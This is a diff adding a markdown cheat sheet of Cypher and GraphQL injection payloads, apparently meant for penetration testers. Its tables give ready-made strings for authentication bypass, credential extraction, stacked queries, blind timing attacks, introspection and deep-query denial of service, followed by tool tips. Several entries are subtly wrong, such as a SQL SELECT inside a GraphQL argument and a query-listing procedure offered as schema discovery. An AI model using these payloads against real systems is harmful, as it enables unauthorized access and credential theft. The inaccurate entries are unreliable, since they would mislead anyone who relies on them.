@@ -1,3 +1,55 @@
+# Cypher & GraphQL Injection Cheat Sheet
+
+
+---
+
+## Cypher Injection
+
+| Scenario                         | Payload Example                                       | Notes                                                                                  |
+| -------------------------------- | ----------------------------------------------------- | -------------------------------------------------------------------------------------- |
+| **Authentication Bypass**        | `username: ' OR 1=1 //`<br>`password: anything`       | Uses `OR 1=1` and `//` to skip password check.                                         |
+| **Comment Out Remainder**        | `' MATCH (n) RETURN n //`                             | Inject after quote to comment out rest of original query.                              |
+| **Union-Style Data Extraction**  | `' MATCH (u:User) RETURN u.username, u.password //`   | If app echoes columns, can exfiltrate user credentials.                                |
+| **Stacked Queries**              | `'; CALL dbms.query('MATCH (n) RETURN n LIMIT 5') //` | In Neo4j 4.x+ you can run arbitrary Cypher via `CALL dbms.query`.                      |
+| **Error-Based Info Leak**        | `id: 1) WITH 1/0 AS x RETURN x //`                    | Trigger divide-by-zero to reveal error messages (and possibly query structure).        |
+| **Time-Based Blind**             | `id: 1) CALL apoc.util.sleep(5000) RETURN 'pong' //`  | Use APOC sleep to delay response when a condition is true (if APOC plugin is enabled). |
+| **Label & Property Enumeration** | `' MATCH (n) RETURN labels(n), keys(n) LIMIT 5 //`    | Dynamically list node labels and property keys.                                        |
+
+---
+
+## GraphQL Injection
+
+| Scenario                              | Payload Example                                                                              | Notes                                                                                     |
+| ------------------------------------- | -------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
+| **Introspection Discovery**           | `query { __schema { types { name fields { name } } } }`                                      | Enumerate all types and their fields exposed by the API.                                  |
+| **Union / Inline Fragment Injection** | `{ user(id:1) { ... on Admin { secretKey } ... on User { name } } }`                         | Test for unexpected fragments or elevated-privilege fields.                               |
+| **Argument-Based Injection**          | `{ user(id:"1\" OR \"1\"=\"1") { id name } }`                                                | Classic OR-based bypass inside a quoted argument.                                         |
+| **Mutation Abuse**                    | `mutation { createUser(username:"attacker", password:"pass"); __schema { types { name } } }` | If multiple operations allowed, append introspection to a mutation.                       |
+| **Batching / Deep Query**             | `{ search(q:"a"){ results { ... on User{id name friends{ id name friends{ id } } } } } }`    | Craft deeply nested selections to test for depth limits or induce DoS.                    |
+| **Error-Based Leak**                  | `{ user(id:1) { posts(filter:"<script>alert(1)</script>") } }`                               | If server echoes arguments in errors, injection results may appear in the error response. |
+| **Time-Based Blind (Apollo)**         | `mutation { delay(ms:5000) @client }`                                                        | Some Apollo setups support client-side directives that can be abused to delay responses.  |
+
+---
+
+## Additional Techniques & Tools
+
+| Technique / Tool            | Payload / Command                                                     | Notes                                                       |
+| --------------------------- | --------------------------------------------------------------------- | ----------------------------------------------------------- |
+| **Boolean-Based Blind**     | `id:"1\" AND substring((SELECT password FROM User LIMIT 1),1,1)='a"`  | Pivot to blind-injection when no errors are returned.       |
+| **Rate- & Depth-Limiting**  | Deep query: `127.0.0.1:8080/graphql?query={a{b{c{…}}}}`               | Many GraphQL servers enforce max depth—probe to map limits. |
+| **Neo4j-Browser**           | —                                                                     | Use for live Cypher injection experiments.                  |
+| **GraphiQL / Insomnia**     | —                                                                     | Craft, replay, and fuzz GraphQL queries.                    |
+| **Burp Suite + Extensions** | **GraphQL** plugin for automated introspection and injection testing. | Integrate into your normal Burp workflow.                   |
+
+---
+
+
+> * Always begin with schema discovery—Cypher via `CALL dbms.listQueries()` or GraphQL via introspection.
+> * Leverage comments (`//`, `/*…*/`) to truncate original queries.
+> * Record response times for blind techniques.
+> * Automate repetitive payloads with your favorite scripting language or Burp macros.
+
+
 
 ##
 #
